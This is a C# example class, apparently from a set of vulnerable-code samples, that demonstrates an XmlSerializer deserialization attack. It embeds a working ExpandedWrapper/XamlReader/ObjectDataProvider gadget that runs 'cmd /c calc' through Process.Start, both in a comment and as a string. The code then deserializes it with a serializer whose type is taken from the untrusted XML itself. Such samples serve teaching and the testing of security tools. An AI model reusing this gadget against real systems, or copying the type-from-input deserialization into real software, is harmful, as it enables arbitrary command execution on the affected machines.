using System;
using System.IO;
using System.Xml;
using System.Xml.Serialization;

namespace mvcapp.ExampleClasses
{
    public class UseCaseEleven
    {
        public static void Run()
        {
            /*
             <root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider>
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    &lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot; xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;
                        &lt;ObjectDataProvider x:Key=&quot;LaunchCmd&quot; ObjectType=&quot;{x:Type Diag:Process}&quot; MethodName=&quot;Start&quot;&gt;
                            &lt;ObjectDataProvider.MethodParameters&gt;
                                &lt;System:String&gt;cmd&lt;/System:String&gt;
                                &lt;System:String&gt;/c calc&lt;/System:String&gt;
                            &lt;/ObjectDataProvider.MethodParameters&gt;
                        &lt;/ObjectDataProvider&gt;
                    &lt;/ResourceDictionary&gt;
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
             */
            // ReSharper disable once UnusedVariable


            var xml =
                "<root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">\r\n    <ExpandedWrapperOfXamlReaderObjectDataProvider>\r\n        <ExpandedElement/>\r\n        <ProjectedProperty0>\r\n            <MethodName>Parse</MethodName>\r\n            <MethodParameters>\r\n                <anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\">\r\n                    &lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot; xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;\r\n                        &lt;ObjectDataProvider x:Key=&quot;LaunchCmd&quot; ObjectType=&quot;{x:Type Diag:Process}&quot; MethodName=&quot;Start&quot;&gt;\r\n                            &lt;ObjectDataProvider.MethodParameters&gt;\r\n                                &lt;System:String&gt;cmd&lt;/System:String&gt;\r\n                                &lt;System:String&gt;/c calc&lt;/System:String&gt;\r\n                            &lt;/ObjectDataProvider.MethodParameters&gt;\r\n                        &lt;/ObjectDataProvider&gt;\r\n                    &lt;/ResourceDictionary&gt;\r\n                </anyType>\r\n            </MethodParameters>\r\n            <ObjectInstance xsi:type=\"XamlReader\"></ObjectInstance>\r\n        </ProjectedProperty0>\r\n    </ExpandedWrapperOfXamlReaderObjectDataProvider>\r\n</root>";

            var xmlDoc = new XmlDocument();
            xmlDoc.LoadXml(xml);
            var xmlItem = (XmlElement) xmlDoc.SelectSingleNode("root");
            var xmlSerializer = new XmlSerializer(Type.GetType(xmlItem.GetAttribute("type")));
            using (var textReader = new StringReader(xmlItem.InnerXml))
            {
                var deserialized = xmlSerializer.Deserialize(new XmlTextReader(textReader));
            }
        }
    }
}